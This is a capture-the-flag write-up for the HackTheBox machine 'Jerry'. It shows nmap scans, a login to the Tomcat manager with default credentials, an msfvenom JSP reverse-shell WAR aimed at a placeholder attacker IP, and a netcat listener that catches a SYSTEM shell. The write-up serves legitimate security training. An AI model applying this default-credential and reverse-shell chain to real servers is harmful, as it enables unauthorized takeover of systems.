---
description: Jerry box from HackTheBox write up.
---

# Jerry

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -v -p- --min-rate 1000 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 16:47 EDT
Initiating Ping Scan at 16:47
Scanning <MACHINE_IP> [4 ports]
Completed Ping Scan at 16:47, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:47
Completed Parallel DNS resolution of 1 host. at 16:47, 0.00s elapsed
Initiating SYN Stealth Scan at 16:47
Scanning <MACHINE_IP> [65535 ports]
Discovered open port 8080/tcp on <MACHINE_IP>
SYN Stealth Scan Timing: About 23.19% done; ETC: 16:49 (0:01:43 remaining)
SYN Stealth Scan Timing: About 51.21% done; ETC: 16:49 (0:00:58 remaining)
Completed SYN Stealth Scan at 16:48, 102.13s elapsed (65535 total ports)
Nmap scan report for <MACHINE_IP>
Host is up (0.052s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 102.34 seconds
           Raw packets sent: 131151 (5.771MB) | Rcvd: 80 (3.504KB)
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p8080 -sC -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 16:52 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.053s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
```

Only Tomcat on port 8080 let's take a look

## Foothold

The first thing i tried was using some default Tomcat credentials to get access to the Application Manager and... `tomcat:s3cret` worked, we are in!

We can try to upload a malicious application now to get a reverse shell. To generate the payload I will use `msfvenom`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATACKER_IP> LPORT=8080 -f war > revshell.war
Payload size: 1086 bytes
Final size of war file: 1086 bytes
```

Now we can upload the generated file to the server and deploy it. Once it is deployed, we can spin up a listener and visit the path that contain our application to get access to the machine:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [<ATACKER_IP>] from (UNKNOWN) [<MACHINE_IP>] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>

```

## Root

Well in this case this was pretty easy:

```
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

We are already `system`! So we can just get our flags under `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` (Remember to use double quotes when trying to read the file!).
